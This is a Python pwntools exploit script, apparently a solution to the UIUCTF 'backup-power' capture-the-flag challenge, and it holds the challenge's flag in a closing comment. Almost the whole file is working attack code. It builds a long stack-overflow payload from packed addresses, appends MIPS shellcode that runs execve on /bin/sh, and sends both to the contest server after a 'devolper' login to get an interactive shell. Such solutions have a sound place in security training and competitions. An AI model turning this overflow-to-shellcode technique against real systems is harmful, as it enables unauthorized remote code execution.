#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./backup-power_patched")

context.binary = exe

REMOTE_NC_CMD    = "nc backup-power.chal.uiuc.tf 1337"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
"""

def conn():
    if args.LOCAL:
        return remote("localhost", 1337)
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]), ssl=True)

def main():
    r = conn()

    payload = p32(0x40800dec)+p32(0x408cec)+p32(0x4aa330)+p32(0x800)+p32(0x800)+p32(0xb0c)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x40800a48)+p32(0x400b0c)+p32(0x400b0c)+p32(0x40800a78)+p32(0xa000000)+p32(0x7efefeff)+p32(0x0)+p32(0x0)+p32(0x4aa330)+p32(0x0)+p32(0x4721c8)+p32(0x0)+p32(0x0)+p32(0x400b0c )+p32(0x6465766f)+p32(0x6c706572)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x746f646f)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x4aa330)+p32(0x0)+p32(0x4c696e75)+p32(0x78000000)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x643062)+p32(0x32316536)+p32(0x4aa330)+p32(0x64000000)+p32(0x3a)+p32(0x4a1460 )+p32(0x4aa330)+p32(0x5b)+p32(0x38)+p32(0x4a1460 )+p32(0x28)+p32(0x5b)+p32(0x41ba4c)+p32(0x6e)+p32(0x5)+p32(0x7c)+p32(0x41ba4c)+p32(0x73687574)+p32(0x646f776e)+p32(0x7c)+p32(0x73687574)+p32(0x75700077)+p32(0x73797374)+p32(0x656d0000)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x0)+p32(0x800)+p32(0x800)+p32(0xb0)+p32(0x40800c24)+p32(0x40800c30)+p32(0x0)+p32(0x0)

    payload += p32(0x40800ce0) + p32(0)*100+ asm('''
  lui $t7, 0x2f2f
  ori $t7, $t7,0x6269
  lui $t6, 0x6e2f
  ori $t6, $t6, 0x7368
  sw $t7, -12($sp)
  sw $t6, -8($sp)
  sw $zero, -4($sp)
  addiu $a0, $sp, -12
  slti $a1, $zero, -1
  slti $a2, $zero, -1
  li $v0, 4011
  syscall 0x040405
''')

    r.recvuntil(b"Username:")
    r.sendline(b"devolper")
    r.sendline(payload.replace(b"\n", b"\x0c"))
    r.recvuntil(b"Username:")
    r.sendline(b"a")
    r.sendline(b"a")
    r.sendline(b"a")

    r.interactive()
    #uiuctf{backup_p0wer_not_r3gisters}

if __name__ == "__main__":
    main()